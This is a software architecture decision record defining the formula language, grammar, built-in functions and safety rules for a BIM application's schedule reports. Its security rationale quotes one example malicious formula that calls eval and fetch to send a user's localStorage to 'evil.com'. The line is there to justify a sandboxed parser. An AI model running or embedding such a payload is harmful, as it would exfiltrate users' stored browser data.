# ADR-0032 — Schedule Formula DSL semantics

- Status: **Accepted** (2026-04-28)
- Sprint: **S41** (Phase 2C — M19–M21, Sheets + Schedules)
- Authors: PRYZM 2 BIM rebuild
- Related: ADR-0031 (sheets architecture, S37–S40),
  `docs/03-execution/plans/legacy/phases/PHASE-2/2C-Q3-M19-M21-SHEETS-SCHEDULES.md` §S41,
  `packages/schemas/src/schedule/`,
  `plugins/schedules/`.

---

## Context

S41 introduces the **Schedules** subsystem — tabular reports bound to a
single element family (door / wall / room / …) whose cell values are
computed by per-column **formulas**.  The schedule editor lets users
type formulas like `width * height`, `SUM(area)`, or
`IF(fireRating > 30, "rated", "")` directly into the column header
cell.

Two non-trivial decisions had to be made before code touched disk:

1. **Formula language** — what's the grammar, what built-ins are
   supported, and what are the semantic edge cases (div-by-zero,
   missing fields, mixed types, circular references, …)?
2. **Execution model** — every PRYZM serialisation format eventually
   becomes a `.pryzm` file that is *executed* on load by other users'
   clients.  We MUST not allow arbitrary JavaScript to run from a
   foreign `.pryzm` file (the spec calls this out as a P0 security
   requirement: ADR-0021 §"plugin descriptor security").

This ADR captures the language design and the safety contract.

## Decision

### A. NO `eval()`, NO `Function(...)`, NO regex-driven dispatch

The formula evaluator is a hand-rolled tokenizer + recursive-descent
parser + tree-walking evaluator.  Source-of-truth implementation:
`plugins/schedules/src/formula-evaluator.ts`.

Rationale:
- A malicious `.pryzm` file containing
  `formula = 'eval("fetch(\\"evil.com\\",{body:JSON.stringify(localStorage)})")'`
  MUST be evaluated as a literal **string**, not executed.
- Hand-rolled parsing means we explicitly enumerate every callable
  identifier — there is no path from a formula identifier to the
  global object.
- The evaluator NEVER constructs `Function` instances and NEVER passes
  user strings to the regex engine in a way that can backtrack
  catastrophically (the regex used for token recognition is bounded
  by single-character lookahead).

### B. Grammar (full)

```
expr       := orExpr
orExpr     := andExpr ('||' andExpr)*
andExpr    := compExpr ('&&' compExpr)*
compExpr   := addExpr (('==' | '!=' | '<' | '<=' | '>' | '>=') addExpr)?
addExpr    := mulExpr (('+' | '-') mulExpr)*
mulExpr    := unaryExpr (('*' | '/' | '%') unaryExpr)*
unaryExpr  := ('!' | '-')? primary
primary    := number | string | bool | 'null'
            | ident
            | ident '(' [expr (',' expr)*] ')'
            | '(' expr ')'
```

- `number`: `/-?[0-9]+(\.[0-9]+)?/` — no exponent (deliberate; revisit
  in S49+ if surveyors ask for it).
- `string`: double- OR single-quoted with `\n \r \t \\ \" \'` escapes.
- `bool`: `true | false`.  `null`: literal.
- `ident`: `/[A-Za-z_][A-Za-z0-9_]*/` — case-sensitive.

### C. Identifier resolution (5 layers, in order)

1. Reserved literals (`true`, `false`, `null`) — handled at lex time.
2. Bare `COUNT` (no parens) — alias for `COUNT()`, returns
   `allElements.length`.  Documented in the §S41 fixture line
   `formula = 'COUNT'`.
3. A field on the current `element` (direct property access — no dot
   paths in S41; revisit if rooms acquire deeply-nested metadata).
4. A column id on the SAME schedule (cross-column reference) —
   evaluated transitively with cycle detection (see §E).
5. Otherwise: throw `FormulaUndefinedIdentifierError` ⇒ cell renders
   `'#UNDEF'`.

### D. Built-in functions (12)

| Function     | Arity | Returns | Notes                                          |
|--------------|-------|---------|------------------------------------------------|
| `COUNT()`    | 0/1   | number  | `COUNT()` = #allElements; `COUNT(expr)` filters|
| `SUM(expr)`  | 1     | number  | sum over allElements; non-numeric values skipped|
| `AVG(expr)`  | 1     | number  | mean over allElements; empty set ⇒ null        |
| `MIN(expr)`  | 1     | number  | min over allElements                           |
| `MAX(expr)`  | 1     | number  | max over allElements                           |
| `IF(c,a,b)`  | 3     | any     | returns `a` if `c` truthy, else `b`            |
| `ROUND(x,n)` | 1/2   | number  | `n` defaults to 0                              |
| `CONCAT(…)`  | ≥0    | string  | concatenates all args after `String(arg)`      |
| `LEN(x)`     | 1     | number  | string / array length, else 0                  |
| `UPPER(x)`   | 1     | string  | `String(x).toUpperCase()`                      |
| `LOWER(x)`   | 1     | string  | `String(x).toLowerCase()`                      |
| `COALESCE(…)`| ≥1    | any     | first non-null/undefined arg                   |

Identifiers that LOOK like builtins but aren't (e.g. `SUMX`,
`countIf`, `Max`) resolve as ordinary identifiers — they fall through
to field lookup and then `'#UNDEF'`.  Adding a built-in is a
deliberate two-line change to `BUILTIN_FUNCTIONS` + the `evalCall`
switch.

### E. Circular reference detection (two layers)

1. **Per-evaluation depth counter** — `FORMULA_MAX_DEPTH = 100`.  Any
   recursive call deeper than 100 levels throws
   `FormulaCircularError` ⇒ cell renders `'#CIRCULAR'`.  This is the
   global cap, hit only by pathological inputs (e.g. mutually
   recursive formulas with no cycle in the *graph* but unbounded
   nested calls).
2. **`visiting` set for cross-column references** — a `Set<columnId>`
   threaded through recursive evaluation.  Re-entry to a column
   already in `visiting` throws `FormulaCircularError` immediately,
   so a true cycle (`A=B+1, B=A+1`) is detected on the second hop
   without unwinding 100 frames.

### F. Per-cell error isolation

If a column formula throws OR its source fails to parse, the affected
**cell** surfaces a sentinel STRING (`'#ERR'`, `'#UNDEF'`,
`'#CIRCULAR'`) and the rest of the row evaluates normally.  The
isolation boundary is the COLUMN, not the row — a typo in column 4
must not prevent column 5 from rendering.  Implementation:
`evaluateSchedule()` wraps every per-column `evaluateAst()` call in
try/catch and chooses the sentinel based on the error subclass.

### G. Coercion table

| Op        | Behaviour                                                   |
|-----------|-------------------------------------------------------------|
| `+ - * / %`| Number-coerce both sides (`Number(x)`); div/mod by zero ⇒ null |
| `== !=`   | SameValue, with numeric-string coercion (`"3" == 3` ⇒ true) |
| `< <= > >=`| Number-coerce both sides; either NaN ⇒ false                |
| `&& \|\|` | Short-circuit on JS truthiness; result coerced to boolean   |
| `!`       | Coerce to boolean and negate                                |
| Unary `-` | Number-coerce and negate                                    |

`null` propagation: arithmetic on null returns null; equality with
null is reflexive only (`null == null ⇒ true`, `null == 0 ⇒ false`).

## Consequences

### Positive
- Foreign `.pryzm` files cannot escape the sandbox via formulas.
- The DSL covers every example in the §S41 spec without bespoke
  syntax (no `$`-prefixed identifiers, no curly braces).
- The evaluator runs identically on Node (export-worker / CSV bake
  worker — S42) and in the browser (live editor).
- Per-cell error isolation matches the principle of least surprise
  inherited from spreadsheet UX (`#REF!` / `#DIV/0!` / etc.).

### Negative
- No regex / lambda / object-literal support.  Users wanting to
  partition rooms by `metadata.tags[0] === 'mech'` cannot.  We'll
  revisit dot paths and array indexing in S49+ once the room schedule
  cohort gives feedback.
- Numeric type coercion is duck-typed (Number(x)).  Currency-coded
  values (`'$3.50'`) silently coerce to NaN, which is documented but
  surprising.

### Future work (not in scope for S41)
- S49+: dot-path field access (`metadata.tags[0]`).
- S49+: locale-aware number formatting on cell display (currently we
  stringify with up to 4 decimal places).
- S49+: regex / pattern matching built-ins.
- S43+: Yjs-aware formula cache invalidation when an upstream element
  store mutates.

## Implementation pointers
- Schemas: `packages/schemas/src/schedule/{schedule.ts,formula.ts}`.
- Stores: `packages/stores/src/{ScheduleStore.ts,ActiveScheduleStore.ts}`.
- Plugin: `plugins/schedules/` — handlers in `src/handlers/`,
  evaluator in `src/formula-evaluator.ts`,
  pipeline in `src/evaluate-schedule.ts`,
  view in `src/view.ts`.
- Tests: `plugins/schedules/__tests__/` (104 tests),
  `packages/stores/__tests__/ScheduleStore.test.ts` (10 tests).
